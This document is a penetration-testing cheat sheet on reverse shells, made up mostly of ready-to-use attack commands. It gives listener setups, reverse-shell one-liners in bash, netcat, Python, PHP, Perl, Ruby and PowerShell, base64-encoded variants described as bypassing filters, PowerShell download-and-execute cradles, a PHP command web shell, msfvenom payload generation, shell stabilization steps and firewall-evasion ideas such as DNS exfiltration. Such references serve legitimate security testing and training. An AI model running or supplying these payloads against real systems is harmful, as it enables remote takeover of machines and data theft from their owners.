# Reverse Shells

Payloads and techniques for establishing reverse connections.

## Concept

```
Target Machine ──────connects to──────> Attacker Machine (Listener)
   (runs payload)                          (nc -lvnp PORT)
```

> [!TIP]
> Use [revshells.com](https://www.revshells.com/) to generate customized reverse shells.

---

## Setting Up Listeners

### Netcat
```bash
nc -lvnp 4444
```

### Netcat with rlwrap (better shell)
```bash
rlwrap nc -lvnp 4444
```

### Socat
```bash
socat TCP-L:4444,fork STDOUT
```

### Metasploit Multi/Handler
```bash
use exploit/multi/handler
set payload <payload_type>
set LHOST <your_IP>
set LPORT 4444
run
```

---

## Linux Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Alternative
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

# Base64 encoded (bypass filters)
echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64
# Then on target:
echo <base64_string> | base64 -d | bash
```

### Netcat
```bash
# Traditional (requires -e)
nc <IP> <PORT> -e /bin/bash

# OpenBSD netcat (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> >/tmp/f
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Alternative
php -r '$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl
```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Windows Reverse Shells

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell (Base64)
```bash
# Encode on Linux
echo 'IEX(IWR http://<IP>/shell.ps1 -UseBasicParsing)' | iconv -t utf-16le | base64 -w 0

# Run on Windows
powershell -enc <base64_string>
```

### PowerShell Web Download
```powershell
# Host Invoke-PowerShellTcp.ps1 from Nishang
powershell IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')
```

### Netcat (Windows)
```cmd
nc.exe <IP> <PORT> -e cmd.exe
```

---

## Web Shells

### PHP Simple
```php
<?php system($_GET['cmd']); ?>
# Usage: http://target/shell.php?cmd=whoami
```

### PHP Reverse Shell
```bash
# Use pentestmonkey's php-reverse-shell.php
# Located at: /usr/share/webshells/php/php-reverse-shell.php
# Edit $ip and $port, then upload
```

### ASPX
```bash
# Generate with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```

### JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

---

## Shell Upgrade (Stabilization)

### Python PTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Full TTY Upgrade
```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell
Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm
export SHELL=bash
```

### Socat Full TTY
```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
```

---

## Bypassing Firewalls

| Technique | Description |
|:----------|:------------|
| Common ports | Use 80, 443, 53 (often allowed outbound) |
| HTTPS shell | Encrypt traffic to avoid inspection |
| DNS tunnel | Exfiltrate over DNS queries |
| ICMP shell | Use ping for covert channel |

---

## Resources

- [RevShells Generator](https://www.revshells.com/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [PentestMonkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
